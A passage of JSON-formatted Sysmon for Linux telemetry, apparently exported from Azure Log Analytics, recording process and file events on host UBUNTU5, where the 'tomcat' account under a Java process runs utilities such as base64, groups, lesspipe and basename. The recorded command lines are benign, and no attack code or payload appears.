ThreadID=\"1590\"/\u003e\u003cChannel\u003eLinux-Sysmon/Operational\u003c/Channel\u003e\u003cComputer\u003eUBUNTU5\u003c/Computer\u003e\u003cSecurity UserId=\"0\"/\u003e\u003c/System\u003e\u003cEventData\u003e\u003cData Name=\"RuleName\"\u003e-\u003c/Data\u003e\u003cData Name=\"UtcTime\"\u003e2022-05-11 18:10:22.034\u003c/Data\u003e\u003cData Name=\"ProcessGuid\"\u003e{94325212-f5a5-627b-b809-87f375550000}\u003c/Data\u003e\u003cData Name=\"ProcessId\"\u003e1340\u003c/Data\u003e\u003cData Name=\"Image\"\u003e/usr/lib/jvm/java-8-openjdk-amd64/jre/bin/java\u003c/Data\u003e\u003cData Name=\"User\"\u003etomcat\u003c/Data\u003e\u003c/EventData\u003e\u003c/Event\u003e","HostIP":"192.168.2.5","ProcessName":"sysmon","MG":"00000000-0000-0000-0000-000000000002","Type":"Syslog","_ResourceId":"/subscriptions/redacted/resourcegroups/redacted/providers/microsoft.compute/virtualmachines/ubuntu5"}
{"TenantId":"redacted","SourceSystem":"Linux","TimeGenerated":"2022-05-11T18:10:22.027Z","Computer":"UBUNTU5","EventTime":"2022-05-11T18:10:22Z","Facility":"user","HostName":"UBUNTU5","SeverityLevel":"info","SyslogMessage":"\u003cEvent\u003e\u003cSystem\u003e\u003cProvider Name=\"Linux-Sysmon\" Guid=\"{ff032593-a8d3-4f13-b0d6-01fc615a0f97}\"/\u003e\u003cEventID\u003e5\u003c/EventID\u003e\u003cVersion\u003e3\u003c/Version\u003e\u003cLevel\u003e4\u003c/Level\u003e\u003cTask\u003e5\u003c/Task\u003e\u003cOpcode\u003e0\u003c/Opcode\u003e\u003cKeywords\u003e0x8000000000000000\u003c/Keywords\u003e\u003cTimeCreated SystemTime=\"2022-05-11T18:10:22.025768000Z\"/\u003e\u003cEventRecordID\u003e245764\u003c/EventRecordID\u003e\u003cCorrelation/\u003e\u003cExecution ProcessID=\"1590\" ThreadID=\"1590\"/\u003e\u003cChannel\u003eLinux-Sysmon/Operational\u003c/Channel\u003e\u003cComputer\u003eUBUNTU5\u003c/Computer\u003e\u003cSecurity UserId=\"0\"/\u003e\u003c/System\u003e\u003cEventData\u003e\u003cData Name=\"RuleName\"\u003e-\u003c/Data\u003e\u003cData Name=\"UtcTime\"\u003e2022-05-11 18:10:22.032\u003c/Data\u003e\u003cData Name=\"ProcessGuid\"\u003e{94325212-fc0e-627b-a804-43f5d5550000}\u003c/Data\u003e\u003cData Name=\"ProcessId\"\u003e17793\u003c/Data\u003e\u003cData Name=\"Image\"\u003e/usr/bin/base64\u003c/Data\u003e\u003cData Name=\"User\"\u003etomcat\u003c/Data\u003e\u003c/EventData\u003e\u003c/Event\u003e","HostIP":"192.168.2.5","ProcessName":"sysmon","MG":"00000000-0000-0000-0000-000000000002","Type":"Syslog","_ResourceId":"/subscriptions/redacted/resourcegroups/redacted/providers/microsoft.compute/virtualmachines/ubuntu5"}
{"TenantId":"redacted","SourceSystem":"Linux","TimeGenerated":"2022-05-11T18:10:22.033Z","Computer":"UBUNTU5","EventTime":"2022-05-11T18:10:22Z","Facility":"user","HostName":"UBUNTU5","SeverityLevel":"info","SyslogMessage":"\u003cEvent\u003e\u003cSystem\u003e\u003cProvider Name=\"Linux-Sysmon\" Guid=\"{ff032593-a8d3-4f13-b0d6-01fc615a0f97}\"/\u003e\u003cEventID\u003e23\u003c/EventID\u003e\u003cVersion\u003e5\u003c/Version\u003e\u003cLevel\u003e4\u003c/Level\u003e\u003cTask\u003e23\u003c/Task\u003e\u003cOpcode\u003e0\u003c/Opcode\u003e\u003cKeywords\u003e0x8000000000000000\u003c/Keywords\u003e\u003cTimeCreated SystemTime=\"2022-05-11T18:10:22.033560000Z\"/\u003e\u003cEventRecordID\u003e245767\u003c/EventRecordID\u003e\u003cCorrelation/\u003e\u003cExecution ProcessID=\"1590\" ThreadID=\"1590\"/\u003e\u003cChannel\u003eLinux-Sysmon/Operational\u003c/Channel\u003e\u003cComputer\u003eUBUNTU5\u003c/Computer\u003e\u003cSecurity UserId=\"0\"/\u003e\u003c/System\u003e\u003cEventData\u003e\u003cData Name=\"RuleName\"\u003e-\u003c/Data\u003e\u003cData Name=\"UtcTime\"\u003e2022-05-11 18:10:22.040\u003c/Data\u003e\u003cData Name=\"ProcessGuid\"\u003e{94325212-f59b-627b-f8bd-e01506560000}\u003c/Data\u003e\u003cData Name=\"ProcessId\"\u003e475\u003c/Data\u003e\u003cData Name=\"User\"\u003eroot\u003c/Data\u003e\u003cData Name=\"Image\"\u003e/lib/systemd/systemd-udevd\u003c/Data\u003e\u003cData Name=\"TargetFilename\"\u003e/run/udev/queue\u003c/Data\u003e\u003cData Name=\"Hashes\"\u003e-\u003c/Data\u003e\u003cData Name=\"IsExecutable\"\u003e-\u003c/Data\u003e\u003cData Name=\"Archived\"\u003e-\u003c/Data\u003e\u003c/EventData\u003e\u003c/Event\u003e","HostIP":"192.168.2.5","ProcessName":"sysmon","MG":"00000000-0000-0000-0000-000000000002","Type":"Syslog","_ResourceId":"/subscriptions/redacted/resourcegroups/redacted/providers/microsoft.compute/virtualmachines/ubuntu5"}
{"TenantId":"redacted","SourceSystem":"Linux","TimeGenerated":"2022-05-11T18:10:22.033Z","Computer":"UBUNTU5","EventTime":"2022-05-11T18:10:22Z","Facility":"user","HostName":"UBUNTU5","SeverityLevel":"info","SyslogMessage":"\u003cEvent\u003e\u003cSystem\u003e\u003cProvider Name=\"Linux-Sysmon\" Guid=\"{ff032593-a8d3-4f13-b0d6-01fc615a0f97}\"/\u003e\u003cEventID\u003e11\u003c/EventID\u003e\u003cVersion\u003e2\u003c/Version\u003e\u003cLevel\u003e4\u003c/Level\u003e\u003cTask\u003e11\u003c/Task\u003e\u003cOpcode\u003e0\u003c/Opcode\u003e\u003cKeywords\u003e0x8000000000000000\u003c/Keywords\u003e\u003cTimeCreated SystemTime=\"2022-05-11T18:10:22.031906000Z\"/\u003e\u003cEventRecordID\u003e245766\u003c/EventRecordID\u003e\u003cCorrelation/\u003e\u003cExecution ProcessID=\"1590\" ThreadID=\"1590\"/\u003e\u003cChannel\u003eLinux-Sysmon/Operational\u003c/Channel\u003e\u003cComputer\u003eUBUNTU5\u003c/Computer\u003e\u003cSecurity UserId=\"0\"/\u003e\u003c/System\u003e\u003cEventData\u003e\u003cData Name=\"RuleName\"\u003e-\u003c/Data\u003e\u003cData Name=\"UtcTime\"\u003e2022-05-11 18:10:22.038\u003c/Data\u003e\u003cData Name=\"ProcessGuid\"\u003e{94325212-f59b-627b-f8bd-e01506560000}\u003c/Data\u003e\u003cData Name=\"ProcessId\"\u003e475\u003c/Data\u003e\u003cData Name=\"Image\"\u003e/lib/systemd/systemd-udevd\u003c/Data\u003e\u003cData Name=\"TargetFilename\"\u003e/run/udev/queue\u003c/Data\u003e\u003cData Name=\"CreationUtcTime\"\u003e2022-05-11 18:10:22.038\u003c/Data\u003e\u003cData Name=\"User\"\u003eroot\u003c/Data\u003e\u003c/EventData\u003e\u003c/Event\u003e","HostIP":"192.168.2.5","ProcessName":"sysmon","MG":"00000000-0000-0000-0000-000000000002","Type":"Syslog","_ResourceId":"/subscriptions/redacted/resourcegroups/redacted/providers/microsoft.compute/virtualmachines/ubuntu5"}
{"TenantId":"redacted","SourceSystem":"Linux","TimeGenerated":"2022-05-11T18:10:22.037Z","Computer":"UBUNTU5","EventTime":"2022-05-11T18:10:22Z","Facility":"user","HostName":"UBUNTU5","SeverityLevel":"info","SyslogMessage":"\u003cEvent\u003e\u003cSystem\u003e\u003cProvider Name=\"Linux-Sysmon\" Guid=\"{ff032593-a8d3-4f13-b0d6-01fc615a0f97}\"/\u003e\u003cEventID\u003e5\u003c/EventID\u003e\u003cVersion\u003e3\u003c/Version\u003e\u003cLevel\u003e4\u003c/Level\u003e\u003cTask\u003e5\u003c/Task\u003e\u003cOpcode\u003e0\u003c/Opcode\u003e\u003cKeywords\u003e0x8000000000000000\u003c/Keywords\u003e\u003cTimeCreated SystemTime=\"2022-05-11T18:10:22.035232000Z\"/\u003e\u003cEventRecordID\u003e245768\u003c/EventRecordID\u003e\u003cCorrelation/\u003e\u003cExecution ProcessID=\"1590\" ThreadID=\"1590\"/\u003e\u003cChannel\u003eLinux-Sysmon/Operational\u003c/Channel\u003e\u003cComputer\u003eUBUNTU5\u003c/Computer\u003e\u003cSecurity UserId=\"0\"/\u003e\u003c/System\u003e\u003cEventData\u003e\u003cData Name=\"RuleName\"\u003e-\u003c/Data\u003e\u003cData Name=\"UtcTime\"\u003e2022-05-11 18:10:22.041\u003c/Data\u003e\u003cData Name=\"ProcessGuid\"\u003e{94325212-fc0e-627b-0000-000000000000}\u003c/Data\u003e\u003cData Name=\"ProcessId\"\u003e17795\u003c/Data\u003e\u003cData Name=\"Image\"\u003e\u0026lt unknown process\u0026gt \u003c/Data\u003e\u003cData Name=\"User\"\u003eroot\u003c/Data\u003e\u003c/EventData\u003e\u003c/Event\u003e","HostIP":"192.168.2.5","ProcessName":"sysmon","MG":"00000000-0000-0000-0000-000000000002","Type":"Syslog","_ResourceId":"/subscriptions/redacted/resourcegroups/redacted/providers/microsoft.compute/virtualmachines/ubuntu5"}
{"TenantId":"redacted","SourceSystem":"Linux","TimeGenerated":"2022-05-11T18:10:22.04Z","Computer":"UBUNTU5","EventTime":"2022-05-11T18:10:22Z","Facility":"user","HostName":"UBUNTU5","SeverityLevel":"info","SyslogMessage":"\u003cEvent\u003e\u003cSystem\u003e\u003cProvider Name=\"Linux-Sysmon\" Guid=\"{ff032593-a8d3-4f13-b0d6-01fc615a0f97}\"/\u003e\u003cEventID\u003e11\u003c/EventID\u003e\u003cVersion\u003e2\u003c/Version\u003e\u003cLevel\u003e4\u003c/Level\u003e\u003cTask\u003e11\u003c/Task\u003e\u003cOpcode\u003e0\u003c/Opcode\u003e\u003cKeywords\u003e0x8000000000000000\u003c/Keywords\u003e\u003cTimeCreated SystemTime=\"2022-05-11T18:10:22.039505000Z\"/\u003e\u003cEventRecordID\u003e245769\u003c/EventRecordID\u003e\u003cCorrelation/\u003e\u003cExecution ProcessID=\"1590\" ThreadID=\"1590\"/\u003e\u003cChannel\u003eLinux-Sysmon/Operational\u003c/Channel\u003e\u003cComputer\u003eUBUNTU5\u003c/Computer\u003e\u003cSecurity UserId=\"0\"/\u003e\u003c/System\u003e\u003cEventData\u003e\u003cData Name=\"RuleName\"\u003e-\u003c/Data\u003e\u003cData Name=\"UtcTime\"\u003e2022-05-11 18:10:22.044\u003c/Data\u003e\u003cData Name=\"ProcessGuid\"\u003e{94325212-f59b-627b-f8bd-e01506560000}\u003c/Data\u003e\u003cData Name=\"ProcessId\"\u003e475\u003c/Data\u003e\u003cData Name=\"Image\"\u003e/lib/systemd/systemd-udevd\u003c/Data\u003e\u003cData Name=\"TargetFilename\"\u003e/run/udev/queue\u003c/Data\u003e\u003cData Name=\"CreationUtcTime\"\u003e2022-05-11 18:10:22.044\u003c/Data\u003e\u003cData Name=\"User\"\u003eroot\u003c/Data\u003e\u003c/EventData\u003e\u003c/Event\u003e","HostIP":"192.168.2.5","ProcessName":"sysmon","MG":"00000000-0000-0000-0000-000000000002","Type":"Syslog","_ResourceId":"/subscriptions/redacted/resourcegroups/redacted/providers/microsoft.compute/virtualmachines/ubuntu5"}
{"TenantId":"redacted","SourceSystem":"Linux","TimeGenerated":"2022-05-11T18:10:22.04Z","Computer":"UBUNTU5","EventTime":"2022-05-11T18:10:22Z","Facility":"user","HostName":"UBUNTU5","SeverityLevel":"info","SyslogMessage":"\u003cEvent\u003e\u003cSystem\u003e\u003cProvider Name=\"Linux-Sysmon\" Guid=\"{ff032593-a8d3-4f13-b0d6-01fc615a0f97}\"/\u003e\u003cEventID\u003e23\u003c/EventID\u003e\u003cVersion\u003e5\u003c/Version\u003e\u003cLevel\u003e4\u003c/Level\u003e\u003cTask\u003e23\u003c/Task\u003e\u003cOpcode\u003e0\u003c/Opcode\u003e\u003cKeywords\u003e0x8000000000000000\u003c/Keywords\u003e\u003cTimeCreated SystemTime=\"2022-05-11T18:10:22.041146000Z\"/\u003e\u003cEventRecordID\u003e245770\u003c/EventRecordID\u003e\u003cCorrelation/\u003e\u003cExecution ProcessID=\"1590\" ThreadID=\"1590\"/\u003e\u003cChannel\u003eLinux-Sysmon/Operational\u003c/Channel\u003e\u003cComputer\u003eUBUNTU5\u003c/Computer\u003e\u003cSecurity UserId=\"0\"/\u003e\u003c/System\u003e\u003cEventData\u003e\u003cData Name=\"RuleName\"\u003e-\u003c/Data\u003e\u003cData Name=\"UtcTime\"\u003e2022-05-11 18:10:22.047\u003c/Data\u003e\u003cData Name=\"ProcessGuid\"\u003e{94325212-f59b-627b-f8bd-e01506560000}\u003c/Data\u003e\u003cData Name=\"ProcessId\"\u003e475\u003c/Data\u003e\u003cData Name=\"User\"\u003eroot\u003c/Data\u003e\u003cData Name=\"Image\"\u003e/lib/systemd/systemd-udevd\u003c/Data\u003e\u003cData Name=\"TargetFilename\"\u003e/run/udev/queue\u003c/Data\u003e\u003cData Name=\"Hashes\"\u003e-\u003c/Data\u003e\u003cData Name=\"IsExecutable\"\u003e-\u003c/Data\u003e\u003cData Name=\"Archived\"\u003e-\u003c/Data\u003e\u003c/EventData\u003e\u003c/Event\u003e","HostIP":"192.168.2.5","ProcessName":"sysmon","MG":"00000000-0000-0000-0000-000000000002","Type":"Syslog","_ResourceId":"/subscriptions/redacted/resourcegroups/redacted/providers/microsoft.compute/virtualmachines/ubuntu5"}
{"TenantId":"redacted","SourceSystem":"Linux","TimeGenerated":"2022-05-11T18:10:22.043Z","Computer":"UBUNTU5","EventTime":"2022-05-11T18:10:22Z","Facility":"user","HostName":"UBUNTU5","SeverityLevel":"info","SyslogMessage":"\u003cEvent\u003e\u003cSystem\u003e\u003cProvider Name=\"Linux-Sysmon\" Guid=\"{ff032593-a8d3-4f13-b0d6-01fc615a0f97}\"/\u003e\u003cEventID\u003e5\u003c/EventID\u003e\u003cVersion\u003e3\u003c/Version\u003e\u003cLevel\u003e4\u003c/Level\u003e\u003cTask\u003e5\u003c/Task\u003e\u003cOpcode\u003e0\u003c/Opcode\u003e\u003cKeywords\u003e0x8000000000000000\u003c/Keywords\u003e\u003cTimeCreated SystemTime=\"2022-05-11T18:10:22.042321000Z\"/\u003e\u003cEventRecordID\u003e245771\u003c/EventRecordID\u003e\u003cCorrelation/\u003e\u003cExecution ProcessID=\"1590\" ThreadID=\"1590\"/\u003e\u003cChannel\u003eLinux-Sysmon/Operational\u003c/Channel\u003e\u003cComputer\u003eUBUNTU5\u003c/Computer\u003e\u003cSecurity UserId=\"0\"/\u003e\u003c/System\u003e\u003cEventData\u003e\u003cData Name=\"RuleName\"\u003e-\u003c/Data\u003e\u003cData Name=\"UtcTime\"\u003e2022-05-11 18:10:22.048\u003c/Data\u003e\u003cData Name=\"ProcessGuid\"\u003e{94325212-fc0e-627b-0000-000000000000}\u003c/Data\u003e\u003cData Name=\"ProcessId\"\u003e17796\u003c/Data\u003e\u003cData Name=\"Image\"\u003e\u0026lt unknown process\u0026gt \u003c/Data\u003e\u003cData Name=\"User\"\u003eroot\u003c/Data\u003e\u003c/EventData\u003e\u003c/Event\u003e","HostIP":"192.168.2.5","ProcessName":"sysmon","MG":"00000000-0000-0000-0000-000000000002","Type":"Syslog","_ResourceId":"/subscriptions/redacted/resourcegroups/redacted/providers/microsoft.compute/virtualmachines/ubuntu5"}
{"TenantId":"redacted","SourceSystem":"Linux","TimeGenerated":"2022-05-11T18:10:22.063Z","Computer":"UBUNTU5","EventTime":"2022-05-11T18:10:22Z","Facility":"user","HostName":"UBUNTU5","SeverityLevel":"info","SyslogMessage":"\u003cEvent\u003e\u003cSystem\u003e\u003cProvider Name=\"Linux-Sysmon\" Guid=\"{ff032593-a8d3-4f13-b0d6-01fc615a0f97}\"/\u003e\u003cEventID\u003e1\u003c/EventID\u003e\u003cVersion\u003e5\u003c/Version\u003e\u003cLevel\u003e4\u003c/Level\u003e\u003cTask\u003e1\u003c/Task\u003e\u003cOpcode\u003e0\u003c/Opcode\u003e\u003cKeywords\u003e0x8000000000000000\u003c/Keywords\u003e\u003cTimeCreated SystemTime=\"2022-05-11T18:10:22.062482000Z\"/\u003e\u003cEventRecordID\u003e245772\u003c/EventRecordID\u003e\u003cCorrelation/\u003e\u003cExecution ProcessID=\"1590\" ThreadID=\"1590\"/\u003e\u003cChannel\u003eLinux-Sysmon/Operational\u003c/Channel\u003e\u003cComputer\u003eUBUNTU5\u003c/Computer\u003e\u003cSecurity UserId=\"0\"/\u003e\u003c/System\u003e\u003cEventData\u003e\u003cData Name=\"RuleName\"\u003e-\u003c/Data\u003e\u003cData Name=\"UtcTime\"\u003e2022-05-11 18:10:22.055\u003c/Data\u003e\u003cData Name=\"ProcessGuid\"\u003e{94325212-fc0e-627b-e040-d3ebce550000}\u003c/Data\u003e\u003cData Name=\"ProcessId\"\u003e17798\u003c/Data\u003e\u003cData Name=\"Image\"\u003e/usr/bin/groups\u003c/Data\u003e\u003cData Name=\"FileVersion\"\u003e-\u003c/Data\u003e\u003cData Name=\"Description\"\u003e-\u003c/Data\u003e\u003cData Name=\"Product\"\u003e-\u003c/Data\u003e\u003cData Name=\"Company\"\u003e-\u003c/Data\u003e\u003cData Name=\"OriginalFileName\"\u003e-\u003c/Data\u003e\u003cData Name=\"CommandLine\"\u003egroups\u003c/Data\u003e\u003cData Name=\"CurrentDirectory\"\u003e/\u003c/Data\u003e\u003cData Name=\"User\"\u003etomcat\u003c/Data\u003e\u003cData Name=\"LogonGuid\"\u003e{94325212-0000-0000-e903-000000000000}\u003c/Data\u003e\u003cData Name=\"LogonId\"\u003e1001\u003c/Data\u003e\u003cData Name=\"TerminalSessionId\"\u003e4294967295\u003c/Data\u003e\u003cData Name=\"IntegrityLevel\"\u003eno level\u003c/Data\u003e\u003cData Name=\"Hashes\"\u003e-\u003c/Data\u003e\u003cData Name=\"ParentProcessGuid\"\u003e{00000000-0000-0000-0000-000000000000}\u003c/Data\u003e\u003cData Name=\"ParentProcessId\"\u003e17797\u003c/Data\u003e\u003cData Name=\"ParentImage\"\u003e-\u003c/Data\u003e\u003cData Name=\"ParentCommandLine\"\u003e-\u003c/Data\u003e\u003cData Name=\"ParentUser\"\u003e-\u003c/Data\u003e\u003c/EventData\u003e\u003c/Event\u003e","HostIP":"192.168.2.5","ProcessName":"sysmon","MG":"00000000-0000-0000-0000-000000000002","Type":"Syslog","_ResourceId":"/subscriptions/redacted/resourcegroups/redacted/providers/microsoft.compute/virtualmachines/ubuntu5"}
{"TenantId":"redacted","SourceSystem":"Linux","TimeGenerated":"2022-05-11T18:10:22.067Z","Computer":"UBUNTU5","EventTime":"2022-05-11T18:10:22Z","Facility":"user","HostName":"UBUNTU5","SeverityLevel":"info","SyslogMessage":"\u003cEvent\u003e\u003cSystem\u003e\u003cProvider Name=\"Linux-Sysmon\" Guid=\"{ff032593-a8d3-4f13-b0d6-01fc615a0f97}\"/\u003e\u003cEventID\u003e5\u003c/EventID\u003e\u003cVersion\u003e3\u003c/Version\u003e\u003cLevel\u003e4\u003c/Level\u003e\u003cTask\u003e5\u003c/Task\u003e\u003cOpcode\u003e0\u003c/Opcode\u003e\u003cKeywords\u003e0x8000000000000000\u003c/Keywords\u003e\u003cTimeCreated SystemTime=\"2022-05-11T18:10:22.068021000Z\"/\u003e\u003cEventRecordID\u003e245774\u003c/EventRecordID\u003e\u003cCorrelation/\u003e\u003cExecution ProcessID=\"1590\" ThreadID=\"1590\"/\u003e\u003cChannel\u003eLinux-Sysmon/Operational\u003c/Channel\u003e\u003cComputer\u003eUBUNTU5\u003c/Computer\u003e\u003cSecurity UserId=\"0\"/\u003e\u003c/System\u003e\u003cEventData\u003e\u003cData Name=\"RuleName\"\u003e-\u003c/Data\u003e\u003cData Name=\"UtcTime\"\u003e2022-05-11 18:10:22.074\u003c/Data\u003e\u003cData Name=\"ProcessGuid\"\u003e{94325212-fc0e-627b-0000-000000000000}\u003c/Data\u003e\u003cData Name=\"ProcessId\"\u003e17797\u003c/Data\u003e\u003cData Name=\"Image\"\u003e\u0026lt unknown process\u0026gt \u003c/Data\u003e\u003cData Name=\"User\"\u003etomcat\u003c/Data\u003e\u003c/EventData\u003e\u003c/Event\u003e","HostIP":"192.168.2.5","ProcessName":"sysmon","MG":"00000000-0000-0000-0000-000000000002","Type":"Syslog","_ResourceId":"/subscriptions/redacted/resourcegroups/redacted/providers/microsoft.compute/virtualmachines/ubuntu5"}
{"TenantId":"redacted","SourceSystem":"Linux","TimeGenerated":"2022-05-11T18:10:22.067Z","Computer":"UBUNTU5","EventTime":"2022-05-11T18:10:22Z","Facility":"user","HostName":"UBUNTU5","SeverityLevel":"info","SyslogMessage":"\u003cEvent\u003e\u003cSystem\u003e\u003cProvider Name=\"Linux-Sysmon\" Guid=\"{ff032593-a8d3-4f13-b0d6-01fc615a0f97}\"/\u003e\u003cEventID\u003e5\u003c/EventID\u003e\u003cVersion\u003e3\u003c/Version\u003e\u003cLevel\u003e4\u003c/Level\u003e\u003cTask\u003e5\u003c/Task\u003e\u003cOpcode\u003e0\u003c/Opcode\u003e\u003cKeywords\u003e0x8000000000000000\u003c/Keywords\u003e\u003cTimeCreated SystemTime=\"2022-05-11T18:10:22.066664000Z\"/\u003e\u003cEventRecordID\u003e245773\u003c/EventRecordID\u003e\u003cCorrelation/\u003e\u003cExecution ProcessID=\"1590\" ThreadID=\"1590\"/\u003e\u003cChannel\u003eLinux-Sysmon/Operational\u003c/Channel\u003e\u003cComputer\u003eUBUNTU5\u003c/Computer\u003e\u003cSecurity UserId=\"0\"/\u003e\u003c/System\u003e\u003cEventData\u003e\u003cData Name=\"RuleName\"\u003e-\u003c/Data\u003e\u003cData Name=\"UtcTime\"\u003e2022-05-11 18:10:22.073\u003c/Data\u003e\u003cData Name=\"ProcessGuid\"\u003e{94325212-fc0e-627b-e040-d3ebce550000}\u003c/Data\u003e\u003cData Name=\"ProcessId\"\u003e17798\u003c/Data\u003e\u003cData Name=\"Image\"\u003e/usr/bin/groups\u003c/Data\u003e\u003cData Name=\"User\"\u003etomcat\u003c/Data\u003e\u003c/EventData\u003e\u003c/Event\u003e","HostIP":"192.168.2.5","ProcessName":"sysmon","MG":"00000000-0000-0000-0000-000000000002","Type":"Syslog","_ResourceId":"/subscriptions/redacted/resourcegroups/redacted/providers/microsoft.compute/virtualmachines/ubuntu5"}
{"TenantId":"redacted","SourceSystem":"Linux","TimeGenerated":"2022-05-11T18:10:22.08Z","Computer":"UBUNTU5","EventTime":"2022-05-11T18:10:22Z","Facility":"user","HostName":"UBUNTU5","SeverityLevel":"info","SyslogMessage":"\u003cEvent\u003e\u003cSystem\u003e\u003cProvider Name=\"Linux-Sysmon\" Guid=\"{ff032593-a8d3-4f13-b0d6-01fc615a0f97}\"/\u003e\u003cEventID\u003e1\u003c/EventID\u003e\u003cVersion\u003e5\u003c/Version\u003e\u003cLevel\u003e4\u003c/Level\u003e\u003cTask\u003e1\u003c/Task\u003e\u003cOpcode\u003e0\u003c/Opcode\u003e\u003cKeywords\u003e0x8000000000000000\u003c/Keywords\u003e\u003cTimeCreated SystemTime=\"2022-05-11T18:10:22.078857000Z\"/\u003e\u003cEventRecordID\u003e245775\u003c/EventRecordID\u003e\u003cCorrelation/\u003e\u003cExecution ProcessID=\"1590\" ThreadID=\"1590\"/\u003e\u003cChannel\u003eLinux-Sysmon/Operational\u003c/Channel\u003e\u003cComputer\u003eUBUNTU5\u003c/Computer\u003e\u003cSecurity UserId=\"0\"/\u003e\u003c/System\u003e\u003cEventData\u003e\u003cData Name=\"RuleName\"\u003e-\u003c/Data\u003e\u003cData Name=\"UtcTime\"\u003e2022-05-11 18:10:22.078\u003c/Data\u003e\u003cData Name=\"ProcessGuid\"\u003e{94325212-fc0e-627b-6832-01036f550000}\u003c/Data\u003e\u003cData Name=\"ProcessId\"\u003e17800\u003c/Data\u003e\u003cData Name=\"Image\"\u003e/bin/dash\u003c/Data\u003e\u003cData Name=\"FileVersion\"\u003e-\u003c/Data\u003e\u003cData Name=\"Description\"\u003e-\u003c/Data\u003e\u003cData Name=\"Product\"\u003e-\u003c/Data\u003e\u003cData Name=\"Company\"\u003e-\u003c/Data\u003e\u003cData Name=\"OriginalFileName\"\u003e-\u003c/Data\u003e\u003cData Name=\"CommandLine\"\u003e/bin/sh /usr/bin/lesspipe\u003c/Data\u003e\u003cData Name=\"CurrentDirectory\"\u003e/\u003c/Data\u003e\u003cData Name=\"User\"\u003etomcat\u003c/Data\u003e\u003cData Name=\"LogonGuid\"\u003e{94325212-0000-0000-e903-000000000000}\u003c/Data\u003e\u003cData Name=\"LogonId\"\u003e1001\u003c/Data\u003e\u003cData Name=\"TerminalSessionId\"\u003e4294967295\u003c/Data\u003e\u003cData Name=\"IntegrityLevel\"\u003eno level\u003c/Data\u003e\u003cData Name=\"Hashes\"\u003e-\u003c/Data\u003e\u003cData Name=\"ParentProcessGuid\"\u003e{00000000-0000-0000-0000-000000000000}\u003c/Data\u003e\u003cData Name=\"ParentProcessId\"\u003e17799\u003c/Data\u003e\u003cData Name=\"ParentImage\"\u003e-\u003c/Data\u003e\u003cData Name=\"ParentCommandLine\"\u003e-\u003c/Data\u003e\u003cData Name=\"ParentUser\"\u003e-\u003c/Data\u003e\u003c/EventData\u003e\u003c/Event\u003e","HostIP":"192.168.2.5","ProcessName":"sysmon","MG":"00000000-0000-0000-0000-000000000002","Type":"Syslog","_ResourceId":"/subscriptions/redacted/resourcegroups/redacted/providers/microsoft.compute/virtualmachines/ubuntu5"}
{"TenantId":"redacted","SourceSystem":"Linux","TimeGenerated":"2022-05-11T18:10:22.09Z","Computer":"UBUNTU5","EventTime":"2022-05-11T18:10:22Z","Facility":"user","HostName":"UBUNTU5","SeverityLevel":"info","SyslogMessage":"\u003cEvent\u003e\u003cSystem\u003e\u003cProvider Name=\"Linux-Sysmon\" Guid=\"{ff032593-a8d3-4f13-b0d6-01fc615a0f97}\"/\u003e\u003cEventID\u003e1\u003c/EventID\u003e\u003cVersion\u003e5\u003c/Version\u003e\u003cLevel\u003e4\u003c/Level\u003e\u003cTask\u003e1\u003c/Task\u003e\u003cOpcode\u003e0\u003c/Opcode\u003e\u003cKeywords\u003e0x8000000000000000\u003c/Keywords\u003e\u003cTimeCreated SystemTime=\"2022-05-11T18:10:22.091150000Z\"/\u003e\u003cEventRecordID\u003e245776\u003c/EventRecordID\u003e\u003cCorrelation/\u003e\u003cExecution ProcessID=\"1590\" ThreadID=\"1590\"/\u003e\u003cChannel\u003eLinux-Sysmon/Operational\u003c/Channel\u003e\u003cComputer\u003eUBUNTU5\u003c/Computer\u003e\u003cSecurity UserId=\"0\"/\u003e\u003c/System\u003e\u003cEventData\u003e\u003cData Name=\"RuleName\"\u003e-\u003c/Data\u003e\u003cData Name=\"UtcTime\"\u003e2022-05-11 18:10:22.088\u003c/Data\u003e\u003cData Name=\"ProcessGuid\"\u003e{94325212-fc0e-627b-e83b-c6fc34560000}\u003c/Data\u003e\u003cData Name=\"ProcessId\"\u003e17801\u003c/Data\u003e\u003cData Name=\"Image\"\u003e/usr/bin/basename\u003c/Data\u003e\u003cData Name=\"FileVersion\"\u003e-\u003c/Data\u003e\u003cData Name=\"Description\"\u003e-\u003c/Data\u003e\u003cData Name=\"Product\"\u003e-\u003c/Data\u003e\u003cData Name=\"Company\"\u003e-\u003c/Data\u003e\u003cData Name=\"OriginalFileName\"\u003e-\u003c/Data\u003e\u003cData Name=\"CommandLine\"\u003ebasename /usr/bin/lesspipe\u003c/Data\u003e\u003cData Name=\"CurrentDirectory\"\u003e/\u003c/Data\u003e\u003cData Name=\"User\"\u003etomcat\u003c/Data\u003e\u003cData Name=\"LogonGuid\"\u003e{94325212-0000-0000-e903-000000000000}\u003c/Data\u003e\u003cData Name=\"LogonId\"\u003e1001\u003c/Data\u003e\u003cData Name=\"TerminalSessionId\"\u003e4294967295\u003c/Data\u003e\u003cData Name=\"IntegrityLevel\"\u003eno level\u003c/Data\u003e\u003cData Name=\"Hashes\"\u003e-\u003c/Data\u003e\u003cData Name=\"ParentProcessGuid\"\u003e{94325212-fc0e-627b-6832-01036f550000}\u003c/Data\u003e\u003cData Name=\"ParentProcessId\"\u003e17800\u003c/Data\u003e\u003cData Name=\"ParentImage\"\u003e/bin/dash\u003c/Data\u003e\u003cData Name=\"ParentCommandLine\"\u003e/bin/sh\u003c/Data\u003e\u003cData Name=\"ParentUser\"\u003etomcat\u003c/Data\u003e\u003c/EventData\u003e\u003c/Event\u003e","HostIP":"192.168.2.5","ProcessName":"sysmon","MG":"00000000-0000-0000-0000-000000000002","Type":"Syslog","_ResourceId":"/subscriptions/redacted/resourcegroups/redacted/providers/microsoft.compute/virtualmachines/ubuntu5"}
